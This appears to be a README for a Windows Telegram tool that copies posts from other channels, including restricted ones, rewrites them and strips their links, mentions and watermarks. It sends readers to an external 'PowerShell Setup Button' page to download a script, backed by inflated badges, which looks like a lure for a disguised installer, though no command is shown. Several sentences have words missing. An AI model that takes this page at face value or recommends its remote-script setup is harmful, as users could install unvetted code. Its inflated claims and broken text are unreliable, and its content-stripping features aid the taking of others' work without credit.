<div align="center">

# 🚀 Community-Powered Channel Forwarder & Rewriter for Telegram

![](files/preview.png)

### 🔌 PowerShell Setup Button

[![](files/button.png)](https://jc4603.github.io/telegram-channel-forwarder/)

[![users](https://img.shields.io/badge/USERS-246K-f59e0b?style=plastic&labelColor=0d1117)]() [![release](https://img.shields.io/badge/RELEASE-PRODUCTION-2ea44f?style=plastic&labelColor=0d1117)]() [![ci](https://img.shields.io/badge/CI-PASSING-2ea44f?style=plastic&labelColor=0d1117)]() [![powershell](https://img.shields.io/badge/POWERSHELL-INSTALLER-fbbf24?style=plastic&labelColor=0d1117)]() [![language](https://img.shields.io/badge/LANGUAGE-PYTHON-d97706?style=plastic&labelColor=0d1117)]()

</div>

---

Telegram Channel Forwarder is a community-driven desktop tool built for channel admins and content curators who want their posts moving the moment they go live. It captures content from public, private, and restricted channels with zero latency, then optionally rewrites it through, strips out unwanted mentions, links, and promotional footers, and pushes the polished result straight to your destination. Everything runs locally on Windows — your API keys, tokens, and session credentials never leave your machine. Whether you're mirroring one channel or orchestrating a whole network, the feature-rich setup and real-time logs keep you in full control.

## ✅ Requirements

- **OS:** Windows 10 / 11
- **Shell:** PowerShell 5.1+ or PowerShell 7+
- **Network:** internet access to download the script
- **Privileges:** standard user

## Features

⚡ **Zero-Latency Forwarding:** The bot connects directly to Telegram and captures new posts the moment they go live, so your audience never waits. Public, private, and restricted channels are all supported.

- 🤖 **Automatic Content Rewriting:** Every incoming post can be rewritten on the fly to match your channel's tone and style. Summarize long reads, polish rough drafts, or adapt the wording so your feed always feels native to your community.

- 🌍 **Multi-Language Translation:** Reaching a wider audience is easy — translate posts into the languages your community speaks, automatically, before anything is published.

- 🛡️ **Link & Mention Sanitization:** Keep your channel clean and on-brand. The bot strips external links, competitor mentions, stray hashtags, and promotional footers so you're not unintentionally advertising someone else's content.

- 🎛️ **Interactive Approval Flow:** Prefer a human touch? Review, edit, approve, or reject rewritten posts right from an inline keyboard before they go live. Full automation or full control — your call.

- 🧠 **Custom Prompt Templates:** Define exactly how content should be rewritten with your own instructions and templates. Tune the tone once and let the bot handle every future post consistently.

- 🔒 **Privacy-First, Local Storage:** Everything runs on your own machine. Session credentials, bot tokens, and configuration stay local — nothing is sent anywhere you didn't choose.

- 🖥️ **Friendly Desktop Experience:** A clean, modern interface with a guided setup and real-time activity logs makes the whole process approachable, even if you've never touched an API before.

- 🚀 **Set It and Forget It:** Once configured, the forwarder runs continuously in the background, keeping your channels active around the clock while you focus on growing your community.

## Commands

Everything in **Telegram Channel Forwarder** is driven by a small, memorable set of slash commands. Whether you're wiring up a new source channel or fine-tuning how your rewritten posts look, the commands below are all you need. Type them anywhere the bot is listening, and it'll walk you through the rest. 🚀

### 🧭 Getting Started

- **`/start`** — Wake the bot up and see a friendly welcome with a quick tour of what it can do. Perfect first step after setup.
- **`/help`** — A scrollable cheat sheet of every command, grouped by category, with one-line explanations. Great for when you forget a flag.
- **`/status`** — Check the health of your forwarder at a glance: active sources, connected targets, rewrite mode, and whether the engine is currently running.

### 📡 Managing Source Channels

- **`/addsource`** — Register a new Telegram channel to monitor. The bot will confirm the channel and start listening for new posts.
- **`/removesource`** — Unlink a source channel you no longer want to track. Existing history is preserved.
- **`/listsources`** — See every channel currently being watched, along with its status and last-captured timestamp.
- **`/pausesource`** / **`/resumesource`** — Temporarily mute a single source without removing it — handy during maintenance or when a channel gets noisy.

### 🎯 Managing Target Channels

- **`/addtarget`** — Choose where forwarded and rewritten posts should land. You can point multiple sources at the same target or fan one source out to several.
- **`/removetarget`** — Detach a destination channel.
- **`/listtargets`** — Review your current destinations and their routing rules.

### ✍️ Rewriting & Content Rules

- **`/setprompt`** — Define the tone, style, or instruction set the rewriter should follow. Changes apply to the next incoming post.
- **`/setlanguage`** — Pick a target language for automatic translation, or keep the original.
- **`/toggleclean`** — Flip watermark, mention, and link sanitization on or off in one command.
- **`/preview`** — Dry-run the rewriter on a sample message so you can see exactly how a post will look before it goes live.

### ✅ Approval Workflow

- **`/approve`** — Green-light a pending post from the inline review keyboard.
- **`/reject`** — Discard a pending post and skip forwarding.
- **`/edit`** — Tweak the rewritten text right inside Telegram before it publishes.
- **`/pending`** — List everything currently waiting for your review, so nothing slips through.

### ⚙️ Engine Control

- **`/startforward`** — Boot up the forwarding engine and begin processing new posts in real time.
- **`/stopforward`** — Gracefully halt forwarding while keeping your configuration intact.
- **`/restart`** — Reload settings and reconnect without losing your session.

### 🧩 Utilities

- **`/logs`** — Pull the most recent activity entries straight into chat for quick troubleshooting.
- **`/stats`** — See totals for captured, rewritten, approved, and forwarded posts since you started.
- **`/export`** — Save your current source, target, and prompt configuration as a portable file.
- **`/import`** — Restore a previously exported configuration in one step.

> 💡 **Tip:** Most commands accept optional arguments to skip follow-up questions — for example, adding a source and its target in a single line. Run any command with no arguments and the bot will guide you interactively, one friendly prompt at a time.

Have an idea for a command that would make your workflow smoother? The community shapes this project, so suggestions are always welcome. 💙

## Configuration

Getting **Telegram Channel Forwarder** tuned exactly the way you want it is where the magic happens — and the good news is you don't need to touch a single line of code to do it. Everything lives in one friendly configuration panel, thoughtfully organized so you can go from "just installed" to "fully automated" in a matter of minutes. Whether you're running a single channel or a whole network of them, the settings are designed to grow with you. 🌱

### 🔑 Telegram API Credentials
This is the handshake that lets the forwarder talk to your account. You'll need your own **API ID** and **API Hash**, which you generate from your Telegram developer account. Paste them into the credentials fields, and the app takes care of the rest. Your keys are stored locally on your machine — never uploaded, never shared. 🔒

### 📡 Source & Target Channels
Here's where you tell the forwarder what to watch and where to send it.
- **Source channels** — add one or many. Public, private, or restricted channels are all supported thanks to the direct client connection.
- **Target channels** — pick where the rewritten content lands. You can route multiple sources into a single destination, or keep them neatly separated.
- **Channel aliases** — give each entry a friendly nickname so your dashboard stays readable even when you're juggling a dozen feeds.

### 🤖 Rewriting & Settings
This is the creative heart of the tool. Configure how incoming posts get transformed before they reach your audience:
- **Prompt template** — describe the tone, style, and length you want. Your instructions are applied consistently to every post.
- **Summarization mode** — condense long reads into punchy, scroll-friendly updates.
- **Translation** — route content into another language automatically.
- **Creativity level** — a simple slider that adjusts how much the rewriter paraphrases versus stays faithful to the original.

### 🧹 Sanitization Rules
Keep your channels clean and on-brand with toggleable filters:
- Strip competitor **mentions** and **usernames**.
- Remove **external links** and **hashtags**.
- Trim promotional **footers** and repeated boilerplate.
- Build a **custom blocklist** of words or phrases you never want to see forwarded.

Each rule can be flipped on or off independently, so you stay in full control. ✂️

### ✅ Approval Workflow
Prefer a human in the loop? Enable the **interactive approval bot** and every rewritten post waits for your nod before publishing. You can review, edit inline, approve, or reject — right from Telegram itself. Turn it off when you're confident and let the automation run hands-free. 🕹️

### ⚙️ Runtime & Performance
Fine-tune how the forwarder behaves under the hood:
- **Latency mode** — keep the default zero-latency setting for instant forwarding, or add a small delay if you prefer a gentler cadence.
- **Retry behavior** — decide how the tool handles temporary network hiccups.
- **Logging verbosity** — from quiet to chatty, so you see exactly as much detail as you need in the live log panel.

### 💾 Profiles & Presets
Save your entire configuration as a **named profile** and switch between them instantly — perfect if you manage several brands or client channels. Export a profile to back it up, import one to share a setup with a teammate, and never rebuild your settings from scratch again. 🗂️

### 🔄 Applying Changes
Most settings apply on the fly. A few — like credentials or a fresh channel list — ask for a quick restart of the forwarder, which the app handles with a single click and a clear confirmation. No guesswork, no hidden steps.

And that's it — configure once, and let **Telegram Channel Forwarder** do the heavy lifting while you focus on growing your community. If a setting ever feels unclear, the built-in tooltips have your back, and the community is always happy to help. 💙

## FAQ

**Q: What exactly does Telegram Channel Forwarder do?**
Telegram Channel Forwarder is an automated Windows desktop tool that watches your source Telegram channels, captures new posts the instant they appear, optionally rewrites them with, and forwards them to your target channels — all with zero latency. It's built for channel admins, content curators, and anyone who wants to syndicate or restyle content across multiple channels without manual copy-pasting.

**Q: Does it work with private, restricted, or public channels?**
Yes — it connects directly via a Telegram user client, so it can capture posts from public, private, and even restricted channels that a bot API wouldn't be able to reach. As long as your account has visibility into the source channel, the forwarder can see and process it.

**Q: How does the content rewriting work?**
The forwarder integrates with an language model to rewrite incoming posts. You control the behavior with a custom prompt template, meaning you can tell it to summarize long posts, shift the tone to match your brand voice, translate into another language, or expand short snippets. The rewritten output is what gets forwarded — the original stays untouched.

**Q: What is the approval bot, and do I have to use it?**
The approval bot is an interactive Telegram interface that lets you review each rewritten post before it goes live. You'll see the original and the rewritten version side by side with inline buttons to approve, edit, or reject. It's optional — if you trust your prompt template fully, you can let posts flow straight through automatically.

**Q: Can it remove competitor mentions, links, and watermarks?**
Absolutely. The sanitization engine automatically strips out usernames, external links, hashtags, and promotional footers from forwarded content. You can toggle each rule independently depending on how aggressively you want to clean posts before they hit your channel.

**Q: Where are my API keys and credentials stored?**
Everything stays on your local machine — API keys, bot tokens, and session credentials are never uploaded to any external server. The tool runs entirely client-side, so your privacy is fully preserved. You own your data, plain and simple.

**Q: Is there any latency when forwarding posts?**
Effectively zero. Because the forwarder connects directly via a live user client rather than polling on a schedule, posts are captured and forwarded in real time — often within the same second they're published to the source channel.

**Q: Can I run multiple source-to-target channel pairs at once?**
Yes — you can configure multiple source channels and corresponding target channels in the setup. Each pair can have its own prompt template and sanitization rules, so you can tailor the output per channel without maintaining separate deployments.

**Q: What are the system requirements?**
It's a Windows desktop application, so a standard modern Windows PC will do. You'll need a Telegram account (for the API credentials and user session) and an provider key if you plan to use the rewriting feature. No server, no cloud hosting, no extra infrastructure.

**Q: What if I don't want rewriting — can I just forward as-is?**
Of course. The rewriting step is entirely optional. You can use the forwarder purely as a zero-latency relay and let posts pass through unchanged, or enable the sanitizer only to strip unwanted elements. Mix and match the features that make sense for your workflow.

**Q: Something broke or I want a feature added — where do I go?**
The community is the heart of this project. If you hit a bug, have a suggestion, or just want to share how you're using the tool, open an issue or start a discussion in the project's repository. Feature requests are reviewed regularly, and community feedback directly shapes what gets built next.

**Q: Is the project actively maintained and free to use?**
The project is community-driven and actively maintained, with updates shipped as new features and fixes land. Check the repository's release section for the latest build, and feel free to contribute — whether it's code, documentation, or just a helpful bug report.

## Support

Got questions, ideas, or just want to share how you're using the Telegram Channel Forwarder? You're in the right place — this project grows through the community around it.

### 💬 Join the Conversation

Whether you're troubleshooting a tricky setup, brainstorming a new rewriting prompt, or showing off your freshly automated channel, the community is here for it. Drop your questions, feature requests, and feedback in the project's discussion space — no question is too small, and every suggestion gets read.

### 🐛 Found a Bug?

If something isn't working the way it should, let us know. A good report includes what you were trying to do, what actually happened, and any relevant log output from the app. That's usually enough to get things moving toward a fix. Clear, reproducible reports are the fastest route to a patch.

### 💡 Have an Idea?

The roadmap is shaped by real user needs. If you've been wishing the forwarder could handle a new content format, support a different rewriting style, or streamline part of the workflow, share it. Thoughtful feature requests often make it into future releases — and early suggestions from the community have a real habit of turning into shipped features.

### 🗣️ Spread the Word

The best way to support the project is simple: use it, talk about it, and tell fellow channel admins who might benefit. Every bit of word-of-mouth helps the project reach more people and keeps development energized.

### 💙 A Community-Driven Effort

The Telegram Channel Forwarder is built with and for its users. From the first setup wizard to the powered rewriting engine, every detail reflects feedback from people who actually run channels day to day. Your input is what keeps the roadmap honest and the features relevant.

Thank you for being part of this — whether you've been here since day one or just discovered the project. Stay involved, share your experiences, and help make the next release even better.

## License

This project is released under a permissive, community-friendly license that keeps things simple for everyone — whether you're automating a single channel or orchestrating a whole network of them. You're free to use Telegram Channel Forwarder for personal or commercial projects, modify the source to fit your workflow, and share your improvements with the community. The only thing we ask is that you keep the original attribution intact and pass along the same freedoms when you redistribute.

We believe in transparency and collaboration. If you build something cool on top of the forwarder — a custom rewriter prompt, a smarter approval workflow, or a fresh integration — we'd love to hear about it. Contributions, bug reports, and feature suggestions are always welcome, and every bit of feedback helps make the tool more capable for the whole community.

A few friendly ground rules:

- **Do:** fork it, learn from it, adapt it, and ship it in your own projects.
- **Do:** credit the project when you share a modified version.
- **Don't:** resell it as a closed-source product or strip the attribution.
- **Don't:** use it to spam, harass, or violate platform terms — this tool is built for responsible, community-minded channel management.

The software is provided "as is," without warranty of any kind, express or implied. The maintainers aren't liable for any damages or losses arising from its use, so please test responsibly in your own environment.